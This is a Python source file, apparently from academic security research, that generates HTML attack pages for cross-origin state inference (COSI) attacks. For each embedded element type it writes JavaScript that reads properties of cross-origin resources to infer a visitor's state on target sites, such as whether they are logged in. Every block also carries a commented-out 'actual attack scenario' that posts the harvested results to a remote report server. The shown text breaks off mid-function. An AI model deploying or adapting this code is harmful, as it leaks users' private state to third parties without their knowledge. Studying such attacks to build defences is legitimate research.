# -*- coding: utf-8 -*-

"""
	Copyright (C) 2019  Soheil Khodayari, IMDEA Software
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.
	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	Description:
	---------------
	Attack Page Generator Class for Object Properties (OP)

"""


# ----------------------------------------------------------------------- #
#                  EF Attack Page Generator Class
# ----------------------------------------------------------------------- #

import json
import time
class OPAttackPageGenerator(object):
    """
        a pluggable HTML attack page generator class for COSI attacks
    """
    def __init__(self, uuid, ef_apg, **kwargs):
        self._uuid = uuid 
        for key in kwargs:
            setattr(self, key, kwargs[key])

        self._ef_apg = ef_apg  # re-use the same EF methods

    def __unicode__(self):
        return 'EF-APG ID-%s'%str(self._uuid)

    def __str__(self):
        return 'EF-APG ID-%s'%str(self._uuid)

    def __repr__(self):
        return 'EF-APG ID-%s'%str(self._uuid)

    # ----------------------------------------------------------------------- #
    #                   Common Public Methods
    # ----------------------------------------------------------------------- #

    def getID(self):
        return self._uuid

    def _convert_dict_to_string_for_js(self, d):
        """
            This funcion replace single quote with double quote and vica versa 
            because inner strings in python and js are oppositely encoded
        """
        string = json.dumps(d)
        # SINGLE_QUOTE_STR = 'SINGLE_QUOTE_STR'
        # string = string.replace("\'", SINGLE_QUOTE_STR)
        # string = string.replace("\"", "\'")
        # string = string.replace(SINGLE_QUOTE_STR, "\"")
        return string

    def java_string_hashcode(self, s):
        """Mimic Java's hashCode in python 2"""
        try:
            s = unicode(s)
        except:
            try:
                s = unicode(s.decode('utf8'))
            except:
                raise Exception("Please enter a unicode type string or utf8 bytestring.")
        h = 0
        for c in s:
            h = int((((31 * h + ord(c)) ^ 0x80000000) & 0xFFFFFFFF) - 0x80000000)
        return h
    # ----------------------------------------------------------------------- #
    #                   Common Private Methods
    # ----------------------------------------------------------------------- #

    def get_ef_op_attack_page_multiple_inclusion(self, ks, report_uri):
        document_title = "EF_OP_Page"
        _ef_apg_instance = self._ef_apg

        ks_include = ks["IncludeME"]
        ef_ks_lookup = ks["EF"]["LookupME"]
        op_ks_lookup = ks["OP"]["LookupME"]
        idx = 0
        ks_ef_lookup_string = _ef_apg_instance._convert_dict_to_string(ef_ks_lookup)
        ks_op_lookup_string = _ef_apg_instance._convert_dict_to_string(op_ks_lookup)
        html = _ef_apg_instance._get_base_dom_document(document_title)   
        html = _ef_apg_instance._attach_ef_global_memory(html) # NOT NEEDED IN OP ONLY PAGE
        html = _ef_apg_instance._attack_ef_console_state_printer(html)   # NOT NEEDED IN OP ONLY PAGE   
        html = self._attack_op_console_state_printer(html)  
        for inclusion_url in ks_include:
            tag_event_dict = ks_include[inclusion_url]
            for tag in tag_event_dict:
                idx = idx + 1
                tag_uuid = idx
                event_list = tag_event_dict[tag]
                html = _ef_apg_instance._attach_ef_define_order_list(html, tag_uuid) # NOT NEEDED IN OP ONLY PAGE
                html = _ef_apg_instance._attach_ef_log_collector(html, inclusion_url, tag, tag_uuid, event_list) 
                html = _ef_apg_instance._attach_ef_log_sender(html, inclusion_url, tag, tag_uuid, report_uri, ks_ef_lookup_string) # NOT NEEDED IN OP ONLY PAGE
                if len(event_list)==0:
                    html = self._attach_object_props_log_sender(html, inclusion_url, tag, tag_uuid, report_uri, ks_op_lookup_string)

        return html

    def get_op_attack_page_multiple_inclusion(self, ks, report_uri):
        document_title = "OP_Page"
        _ef_apg_instance = self._ef_apg

        ks_include = ks["IncludeME"]
        op_ks_lookup = ks["OP"]["LookupME"]
        idx = 0
        ks_op_lookup_string = self._convert_dict_to_string_for_js(op_ks_lookup)
        # return ks_op_lookup_string
        html = _ef_apg_instance._get_base_dom_document(document_title)    
        html = self._attack_op_console_state_printer(html)  
        for inclusion_url in ks_include:
            tag_event_dict = ks_include[inclusion_url]
            for tag in tag_event_dict:
                idx = idx + 1
                tag_uuid = idx
                event_list = tag_event_dict[tag]
                html = _ef_apg_instance._attach_ef_log_collector(html, inclusion_url, tag, tag_uuid, event_list) 
                if len(event_list)==0:
                    html = self._attach_object_props_log_sender(html, inclusion_url, tag, tag_uuid, report_uri, ks_op_lookup_string)
        return html

    def _attack_op_console_state_printer(self, html, include_in_head = False):
        js = '''
        <script type="text/javascript">
            var DEBUG = false;
            // checks whether an element of the input_list includes the provided input_substring
            // and returns the index of that element in the input_list
            var hasMatchingElementWithSubstring = function(input_list, input_substring){
                for(var i=0; i< input_list.length; i++){
                    var listItem = input_list[i];
                    if(listItem.includes(input_substring)){
                        return i;
                    }
                }
                return -1;
            }
            var PrintOPState = function(props, o, table, target, t){
                var lookup = JSON.parse(table);
                // var target_url = o.target_url;
                var target_url = target;
                // var tag = o.tag;
                var tag = t;
                DEBUG && console.log(target_url)

                var desired_lookup_tbl = lookup[target_url][tag];
                var lookup_keys = Object.keys(desired_lookup_tbl);
                DEBUG && console.log(desired_lookup_tbl);

                var key_values_strlist = [];
                for (var prop in props){
                    key_values_strlist.push(""+prop+":"+props[prop]);
                }
                DEBUG && console.log(key_values_strlist);
                
                for(var idx=0; idx< key_values_strlist.length; idx++){
                    var element = key_values_strlist[idx].replace(/\"/g,"");
                    key_values_strlist[idx] = element;
                    matchIndex = hasMatchingElementWithSubstring(lookup_keys, element);
                    if( matchIndex >=0){
                        console.log("[OP] Possible_State: "+desired_lookup_tbl[lookup_keys[matchIndex]])
                    }
                }

            }
            window.PrintOPState = PrintOPState;
        </script>
        '''
        if include_in_head:
            returnHTML = self._ef_apg._include_tag_in_head(html, js)
        else:
            returnHTML = self._ef_apg._include_tag_in_body(html, js)
        return returnHTML


    def _attach_object_props_log_sender(self, html, inclusion_url, tag, tag_uuid, report_uri, ks_lookup_string):
        if tag == "object":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var currentTag = window.tag%s ;
                    props.contentDocument = (currentTag.contentDocument)? new XMLSerializer().serializeToString(currentTag.contentDocument) : convertToText(currentTag.contentDocument);
                    // props.contentDocument = (currentTag.contentDocument)? "document": currentTag.contentDocument;
                    props.contentWindowLength = (currentTag.contentWindow)? currentTag.contentWindow.length: "null";
                    // props.form = (currentTag.form)? "HTMLFormElement": currentTag.form;
                    props.form = convertToText(currentTag.form);
                    props.validity = convertToText(currentTag.validity);
                    props.willValidate = convertToText(currentTag.willValidate);
                    props.validationMessage = convertToText(currentTag.validationMessage);
                    window.props%s = props;
                    var logMessage%s = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }
                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage%s, logMessage%s.ks_lookup, "%s", "%s");

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, tag_uuid, tag_uuid, inclusion_url, tag, report_uri)
        elif tag == "video" or tag == "audio" or tag == "videoPoster":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var currentTag = window.tag%s ;
                    props.duration = convertToText(currentTag.duration);
                    props.readyState = convertToText(currentTag.readyState);
                    props.volume = convertToText(currentTag.volume);
                    props.textTracks = convertToText(currentTag.textTracks);
                    props.audioTracks = convertToText(currentTag.audioTracks);
                    props.videoTracks = convertToText(currentTag.videoTracks);
                    props.seeking = convertToText(currentTag.seeking);
                    props.seekable = convertToText(currentTag.seekable);
                    props.preload = convertToText(currentTag.preload);
                    props.played = convertToText(currentTag.played);
                    props.paused = convertToText(currentTag.paused);
                    props.playbackRate = convertToText(currentTag.playbackRate);
                    props.networkState = convertToText(currentTag.networkState);
                    props.muted = convertToText(currentTag.muted);
                    props.mediaGroup = convertToText(currentTag.mediaGroup);
                    props.error = convertToText(currentTag.error);
                    props.ended = convertToText(currentTag.ended);
                    props.currentTime = convertToText(currentTag.currentTime);
                    props.buffered = convertToText(currentTag.buffered);
                    props.loop = convertToText(currentTag.loop);
                    props.autoplay = convertToText(currentTag.autoplay);

                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag == "source":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var vTag = window.videoTag%s ;
                    var sTag = window.sourceTag%s ;
                    props.duration = convertToText(vTag.duration);
                    props.readyState = convertToText(vTag.readyState);
                    props.volume = convertToText(vTag.volume);
                    props.textTracks = convertToText(vTag.textTracks);
                    props.audioTracks = convertToText(vTag.audioTracks);
                    props.videoTracks = convertToText(vTag.videoTracks);
                    props.seeking = convertToText(vTag.seeking);
                    props.seekable = convertToText(vTag.seekable);
                    props.preload = convertToText(vTag.preload);
                    props.played = convertToText(vTag.played);
                    props.paused = convertToText(vTag.paused);
                    props.playbackRate = convertToText(vTag.playbackRate);
                    props.networkState = convertToText(vTag.networkState);
                    props.muted = convertToText(vTag.muted);
                    props.mediaGroup = convertToText(vTag.mediaGroup);
                    props.error = convertToText(vTag.error);
                    props.ended = convertToText(vTag.ended);
                    props.currentTime = convertToText(vTag.currentTime);
                    props.buffered = convertToText(vTag.buffered);
                    props.loop = convertToText(vTag.loop);
                    props.autoplay = convertToText(vTag.autoplay);
                    props.media = convertToText(sTag.media); 

                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag == "track":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
    
                    var vTag = window.videoTag%s ;
                    var tTag = window.trackTag%s ;

                    props.duration = convertToText(vTag.duration);
                    props.readyState = convertToText(vTag.readyState);
                    props.volume = convertToText(vTag.volume);
                    props.textTracks = convertToText(vTag.textTracks);
                    props.audioTracks = convertToText(vTag.audioTracks);
                    props.videoTracks = convertToText(vTag.videoTracks);
                    props.seeking = convertToText(vTag.seeking);
                    props.seekable = convertToText(vTag.seekable);
                    props.preload = convertToText(vTag.preload);
                    props.played = convertToText(vTag.played);
                    props.paused = convertToText(vTag.paused);
                    props.playbackRate = convertToText(vTag.playbackRate);
                    props.networkState = convertToText(vTag.networkState);
                    props.muted = convertToText(vTag.muted);
                    props.mediaGroup = convertToText(vTag.mediaGroup);
                    props.error = convertToText(vTag.error);
                    props.ended = convertToText(vTag.ended);
                    props.currentTime = convertToText(vTag.currentTime);
                    props.buffered = convertToText(vTag.buffered);
                    props.loop = convertToText(vTag.loop);
                    props.autoplay = convertToText(vTag.autoplay);

                    props.track = convertToText(tTag.track); 
                    props.trackReadyState= convertToText(tTag.readyState); 
                    props.kind= convertToText(tTag.kind);
                    props.label= convertToText(tTag.label);

                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag == "input":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var curretTag = window.tag%s ;

                    props.width = convertToText(curretTag.width);
                    props.height = convertToText(curretTag.height);
                    props.form = convertToText(curretTag.form);
                    props.validity = convertToText(curretTag.validity);
                    props.willValidate = convertToText(curretTag.willValidate);
                    props.validationMessage = convertToText(curretTag.validationMessage);
                    props.labels = convertToText(curretTag.labels);
                    props.list = convertToText(curretTag.list);
                    props.accept = convertToText(curretTag.accept);
                    props.checked = convertToText(curretTag.checked);
                    props.dirName = convertToText(curretTag.dirName);
                    props.disabled = convertToText(curretTag.disabled);
                    props.indeterminate = convertToText(curretTag.indeterminate);
                    props.maxLength = convertToText(curretTag.maxLength);
                    props.max = convertToText(curretTag.max);
                    props.minLength = convertToText(curretTag.minLength);
                    props.min = convertToText(curretTag.min);
                    props.multiple = convertToText(curretTag.multiple);
                    props.size = convertToText(curretTag.size);
                    props.alt = convertToText(curretTag.alt);

                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag == "img":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var currentTag = window.tag%s ;
                    props.width = convertToText(currentTag.width);
                    props.height = convertToText(currentTag.height);
                    props.sizes = convertToText(currentTag.sizes);
                    props.alt = convertToText(currentTag.alt);
                    props.naturalWidth = convertToText(currentTag.naturalWidth);
                    props.naturalHeight = convertToText(currentTag.naturalHeight);
                    props.complete = convertToText(currentTag.complete);
                    props.currentSrc = convertToText(currentTag.currentSrc);
                    props.referrerPolicy = convertToText(currentTag.referrerPolicy);
                    props.decoding = convertToText(currentTag.decoding);
                    props.isMap = convertToText(currentTag.isMap);
                    props.useMap = convertToText(currentTag.useMap);
                    props.crossOrigin = convertToText(currentTag.crossOrigin);
                    props.vspace = convertToText(currentTag.vspace);
                    props.hspace = convertToText(currentTag.hspace);

                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag == "iframe":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var currentTag= window.tag%s ;
                    props.name = convertToText(currentTag.width);
                    props.sandbox = convertToText(currentTag.height);
                    props.allow = convertToText(currentTag.sizes);
                    props.allowFullscreen = convertToText(currentTag.alt);
                    props.allowPaymentRequest = convertToText(currentTag.naturalWidth);
                    props.referrerPolicy = convertToText(currentTag.referrerPolicy);
                    props.contentDocument = convertToText(currentTag.contentDocument);
                    props.contentWindowLength = (currentTag.contentWindow)? currentTag.contentWindow.length: "null";
                    props.width = convertToText(currentTag.width);
                    props.height = convertToText(currentTag.height);


                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag == "embed":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var currentTag = window.tag%s ;
                    props.type = convertToText(currentTag.type);
                    props.width = convertToText(currentTag.width);
                    props.height = convertToText(currentTag.height);


                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag.startswith("link"):
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var currentTag = window.tag%s ;
                    props.relList = convertToText(currentTag.relList);
                    props.media = convertToText(currentTag.media);
                    props.integrity = convertToText(currentTag.integrity);
                    props.hreflang = convertToText(currentTag.hreflang);
                    props.type = convertToText(currentTag.type);
                    props.sizes = convertToText(currentTag.sizes);
